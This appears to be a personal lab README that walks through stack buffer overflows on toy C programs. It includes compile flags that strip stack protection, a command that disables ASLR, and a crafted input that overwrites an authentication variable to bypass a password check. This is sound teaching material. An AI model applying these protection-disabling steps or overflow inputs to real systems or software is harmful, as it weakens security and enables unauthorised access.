# Illustration of buffer overflow concepts

- Let us try to run a simple C program which will demonstrate buffer overflow.
- Since this is a 64 bit VM, we need to compile the C program so that it will be run as 32 bit program.
- Run the following command to compile the C program and provide certain flags to remove overflow protection mechanisms.
  `gcc -o buffer_overflow -fno-stack-protector -z execstack -m32 <buffer_overflow.c>`
- Also you need to set the following at the kernel level
  `echo "0" > /proc/sys/kernel/randomize_va_space`

## Demonstrating the buffer overflow

```

The difference between buf1 and buf2 is 16 bytes.
So the size is 16 bytes as it is allocated by the char buffer.

First buf2 will be allocated and then buf1 will be allocated in contigous allocations in the stack.

In the first case, buf2 has 15 A's and finally it is terminated by the Null character.

┌──(root㉿kali)-[/home/bluejay820/Documents/kali-files/buffer_overflow]
└─# ./buffer_overflow
Enter something for buf2:AAAAAAAAAAAAAAA
Value at buf1: secret
Value at buf2: AAAAAAAAAAAAAAA
Address at buf1: 0xfffffffff250
Address at buf2: 0xfffffffff240
                                                                                      

In the second case, buf2 has 16 A's and since it has to be terminated by the null character, thats get overwritten
into the next variable which is buf1 and hence you cannot see anything in the buf1                                        

┌──(root㉿kali)-[/home/bluejay820/Documents/kali-files/buffer_overflow]
└─# ./buffer_overflow
Enter something for buf2:AAAAAAAAAAAAAAAA
Value at buf1: 
Value at buf2: AAAAAAAAAAAAAAAA
Address at buf1: 0xfffffffff250
Address at buf2: 0xfffffffff240

In the third case, buf2 has 17 A's and now you can see its rolling onto the next variable buf1 the extra additional A with its null character.                                                                                                                              
                                                                                                                              
┌──(root㉿kali)-[/home/bluejay820/Documents/kali-files/buffer_overflow]
└─# ./buffer_overflow
Enter something for buf2:AAAAAAAAAAAAAAAAA
Value at buf1: A
Value at buf2: AAAAAAAAAAAAAAAAA
Address at buf1: 0xfffffffff250
Address at buf2: 0xfffffffff240
```


## Now, let us look at the exploitation program.

```

the auth, system_pass variable gets stored first and they occupy the higher address.

the user_pass if provided with specific input (16 + 1), it will override the system_pass variable. As the difference between
the two addresssess is 16.

where as for the user_pass to reach out and overwrite auth variable, you need to calculate the difference of addressess between auth and system_pass which is 20, so effectively you must have (20 + 1) to override.

So, therefore, 16 + 16 + 5 = 37 ( 'A'*32 + 'B'*5 ) will achive stack overflow exploitation and you will be able to achive the exploitation as demnostrated below.

For more understanding, open the program buffer_overflow_exploit.c

┌──(bluejay820㉿kali)-[~/Documents/kali-files/buffer_overflow]
└─$ ./buffer_overflow_exploit
Enter your password:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBB
Value at user_pass: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBB
Value at system_pass: AAAAAAAAAAAAAAAABBBBB
Address at user_pass: 0xffffffffed38
Address at system_pass: 0xffffffffed48
Address at auth: 0xffffffffed5c
auth variable: 66
Password is correct!


```
